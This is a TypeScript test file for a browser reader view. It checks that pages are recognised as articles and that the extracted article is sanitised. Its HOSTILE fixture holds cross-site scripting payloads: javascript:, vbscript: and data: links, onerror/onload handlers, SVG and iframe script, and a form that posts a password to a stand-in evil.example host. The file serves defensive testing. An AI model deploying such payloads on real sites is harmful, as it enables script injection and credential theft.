/**
 * Reader view's scripts (src/main/reader/scripts.ts), run against pages
 * parsed by linkedom: whether a page reads as an article, and what comes out
 * of one, hostile or not, once core's sanitizeArticle has cleaned it. In
 * Chord they run in the page's isolated world; the E2E suite (reader.spec.ts)
 * runs them there.
 */
import { sanitizeArticle, type ReaderArticle, type ReaderNode } from '@chord/core';
import { parseHTML } from 'linkedom';
import { describe, expect, it } from 'vitest';
import { EXTRACT_SCRIPT, READABLE_SCRIPT } from '../../src/main/reader/scripts';

const PAGE = 'https://news.example/2026/10/a-long-read';

const paragraph = (n: number) =>
  `<p>Paragraph ${n} of the story goes on for a while, as long reads do, with enough words in it that anyone would call it prose rather than a caption, a menu or a list of links to elsewhere on the site.</p>`;

const ARTICLE = `<!doctype html>
<html lang="en"><head><base href="${PAGE}"><title>A long read | News</title>
<meta property="og:site_name" content="News"><meta property="og:title" content="A long read">
<script>window.marker = 'page script ran'</script>
<style>body { font-family: Comic Sans MS }</style>
</head><body>
<header class="site-header"><nav><a href="/">Home</a> <a href="/world">World</a> <a href="/sport">Sport</a></nav></header>
<main><article>
  <h1>A long read</h1>
  <p class="byline">By Jo Writer</p>
  ${paragraph(1)}
  <figure><img src="/img/small.jpg" srcset="/img/400.jpg 400w, /img/1200.jpg 1200w, /img/3000.jpg 3000w" alt="A harbor at dawn" width="1200" height="800"><figcaption>The harbor</figcaption></figure>
  ${paragraph(2)}
  <h2>What happened next</h2>
  ${paragraph(3)}
  <blockquote><p>Quoted words matter, said someone important, at some length, to the reporter.</p></blockquote>
  <ul><li>First point</li><li>Second point</li></ul>
  ${paragraph(4)}
  <p>See <a href="/related">the related story</a> and <a href="#notes">the notes</a>.</p>
  <pre><code>let answer = 42;
  answer++;</code></pre>
  ${paragraph(5)}
  <h3 id="notes">Notes</h3>
  ${paragraph(6)}
</article></main>
<aside class="sidebar"><h2>Most read</h2><ul><li><a href="/1">One</a></li><li><a href="/2">Two</a></li></ul></aside>
<footer class="site-footer"><p>© News</p></footer>
</body></html>`;

const NOT_AN_ARTICLE = `<!doctype html>
<html lang="en"><head><base href="https://shop.example/"><title>Shop</title></head><body>
<header><nav><a href="/">Home</a> <a href="/cart">Cart</a></nav><form><input name="q" placeholder="Search"><button>Go</button></form></header>
<main>
  <h1>Today's deals</h1>
  <ul class="grid">${Array.from({ length: 12 }, (_, i) => `<li><a href="/p/${i}"><img src="/p/${i}.jpg" alt="Item ${i}"> Item ${i}</a> <span>$${i}.99</span> <button>Add</button></li>`).join('')}</ul>
  <p>Free shipping over $50.</p>
</main>
<footer><a href="/help">Help</a> <a href="/terms">Terms</a></footer>
</body></html>`;

const HOSTILE = `<!doctype html>
<html><head><base href="${PAGE}"><title>Hostile</title></head><body><article>
  <h1>Hostile</h1>
  ${paragraph(1)}
  <p onclick="window.marker = 1" style="background: url(javascript:alert(1))" class="lede">Click <a href="javascript:window.marker=1">here</a>,
     <a href="  JaVaScRiPt:alert(1)">there</a>, <a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">or there</a>
     and <a href="vbscript:msgbox(1)">this</a>.</p>
  <p><img src="x" onerror="window.marker = 1" alt="broken"> <img src="javascript:alert(1)" alt="js"> <img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;" alt="svg"></p>
  ${paragraph(2)}
  <p>An inline <svg onload="alert(1)"><script>window.marker = 1</script><a href="javascript:alert(1)"><text>svg link</text></a></svg> drawing.</p>
  <iframe src="https://ads.example/" srcdoc="&lt;script&gt;parent.marker = 1&lt;/script&gt;"></iframe>
  <form action="https://evil.example/steal"><p>Your password: <input type="password" name="pw" value="hunter2"></p><button>Send</button></form>
  ${paragraph(3)}
  <style>.lede { display: none }</style>
  <object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
  <math><mi>x</mi></math>
  <p>Script in text: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> stays text.</p>
  <script>window.marker = 'inline script'</script>
  <noscript><img src="https://tracker.example/pixel.gif"></noscript>
  <template><p>template content</p></template>
  ${paragraph(4)}
  ${paragraph(5)}
</article></body></html>`;

/** What these tests use of linkedom's window (its types assume the DOM library, which main's code doesn't have). */
interface Parsed {
  document: { documentElement: { outerHTML: string } };
  HTMLElement: { prototype: object };
}
const parse = (html: string) => parseHTML(html) as unknown as Parsed;

interface Probe {
  hasAttribute(name: string): boolean;
  style?: { display?: string };
  parentElement: Probe | null;
}

/**
 * Run a reader script on a page, the way the isolated world would: `document` is the page's. linkedom has no
 * content type, document address or checkVisibility(); a browser's document has them (its copy too), so they're
 * filled in as Chromium would answer.
 */
function run(script: string, html: string): unknown {
  const { document, HTMLElement } = parse(html);
  const proto = Object.getPrototypeOf(document) as object;
  Object.defineProperty(proto, 'contentType', { configurable: true, get: () => 'text/html' });
  Object.defineProperty(proto, 'documentURI', { configurable: true, get(this: { baseURI: string }) { return this.baseURI; } });
  Object.defineProperty(HTMLElement.prototype, 'checkVisibility', {
    configurable: true,
    value(this: Probe) {
      const hidden = (node: Probe | null): boolean => node !== null && (node.hasAttribute('hidden') || node.style?.display === 'none' || hidden(node.parentElement));
      return !hidden(this);
    },
  });
  return new Function('document', `return ${script}`)(document) as unknown;
}

function extract(html: string, url = PAGE): ReaderArticle | null {
  const json = run(EXTRACT_SCRIPT, html);
  return typeof json === 'string' ? sanitizeArticle(JSON.parse(json), url) : null;
}

const elements = (nodes: readonly ReaderNode[]): Exclude<ReaderNode, string>[] => nodes.flatMap((n) => (typeof n === 'string' ? [] : [n, ...elements(n.children ?? [])]));
const text = (nodes: readonly ReaderNode[]): string => nodes.map((n) => (typeof n === 'string' ? n : text(n.children ?? []))).join('');

describe('reader view: which pages read as articles', () => {
  it('finds the article in a news story', () => {
    expect(run(READABLE_SCRIPT, ARTICLE)).toBe(true);
  });

  it("doesn't offer it on a shop's front page", () => {
    expect(run(READABLE_SCRIPT, NOT_AN_ARTICLE)).toBe(false);
  });

  it("doesn't count what the page hid", () => {
    const hidden = ARTICLE.replace('<main><article>', '<main><article hidden>');
    expect(run(READABLE_SCRIPT, hidden)).toBe(false);
  });
});

describe('reader view: the article', () => {
  it('takes the story and leaves the site around it', () => {
    const article = extract(ARTICLE)!;
    expect(article).not.toBeNull();
    expect(article.title).toBe('A long read');
    expect(article.site).toBe('News');
    expect(article.lang).toBe('en');
    const body = text(article.content);
    for (let n = 1; n <= 6; n++) expect(body).toContain(`Paragraph ${n} of the story`);
    expect(body).toContain('Quoted words matter');
    expect(body).not.toMatch(/Most read|© News|Sport/);
    // The title is the reader's own heading; the article's start below it.
    const headings = elements(article.content).filter((e) => /^h\d$/.test(e.tag));
    expect(headings.map((h) => h.tag)).toEqual(['h2', 'h3']);
    expect(elements(article.content).map((e) => e.tag)).toEqual(expect.arrayContaining(['figure', 'img', 'figcaption', 'blockquote', 'ul', 'li', 'pre', 'code', 'a']));
    expect(text(elements(article.content).find((e) => e.tag === 'pre')!.children!)).toBe('let answer = 42;\n  answer++;');
    expect(article.words).toBeGreaterThan(200);
  });

  it("picks each image's best address, absolute, and links stay where they went", () => {
    const article = extract(ARTICLE)!;
    // The widest srcset candidate up to twice a reading column.
    expect(article.images).toEqual(['https://news.example/img/1200.jpg']);
    expect(elements(article.content).find((e) => e.tag === 'img')!.attrs).toEqual({ src: '0', alt: 'A harbor at dawn', width: '1200', height: '800' });
    const links = elements(article.content).filter((e) => e.tag === 'a').map((e) => e.attrs!['href']);
    expect(links).toEqual(['https://news.example/related', '#r-notes']);
    expect(elements(article.content).find((e) => e.tag === 'h3')!.attrs).toEqual({ id: 'r-notes' });
  });

  it("never changes the page it reads (Readability works on a copy)", () => {
    const { document } = parse(ARTICLE);
    const proto = Object.getPrototypeOf(document) as object;
    Object.defineProperty(proto, 'contentType', { configurable: true, get: () => 'text/html' });
    const before = document.documentElement.outerHTML;
    new Function('document', `return ${EXTRACT_SCRIPT}`)(document);
    expect(document.documentElement.outerHTML).toBe(before);
  });

  it('keeps nothing from a hostile page that could run, load or submit anything', () => {
    const article = extract(HOSTILE)!;
    expect(article).not.toBeNull();
    const json = JSON.stringify(article);
    expect(json).not.toMatch(/javascript:|vbscript:|data:|onclick|onerror|onload|marker|style|class|hunter2|evil\.example|ads\.example|tracker\.example|template content/i);
    const tags = new Set(elements(article.content).map((e) => e.tag));
    for (const tag of ['script', 'style', 'iframe', 'form', 'input', 'button', 'svg', 'object', 'embed', 'math', 'noscript', 'template']) expect(tags.has(tag as never)).toBe(false);
    // The links' and images' words stay; the code sample is text, not markup.
    const body = text(article.content);
    expect(body).toContain('Click here');
    expect(body).toContain('<script>alert(1)</script>');
    // The one image with a web address, resolved against the page; nothing else to load.
    expect(article.images).toEqual(['https://news.example/2026/10/x']);
  });

  it('is nothing on a page that has no article, or no HTML', () => {
    expect(extract('<!doctype html><html><body><p>Hi.</p></body></html>')).toBeNull();
    const { document } = parse(ARTICLE);
    const proto = Object.getPrototypeOf(document) as object;
    Object.defineProperty(proto, 'contentType', { configurable: true, get: () => 'application/pdf' });
    try {
      expect(new Function('document', `return ${EXTRACT_SCRIPT}`)(document)).toBeNull();
      expect(new Function('document', `return ${READABLE_SCRIPT}`)(document)).toBeNull();
    } finally {
      Object.defineProperty(proto, 'contentType', { configurable: true, get: () => 'text/html' });
    }
  });
});
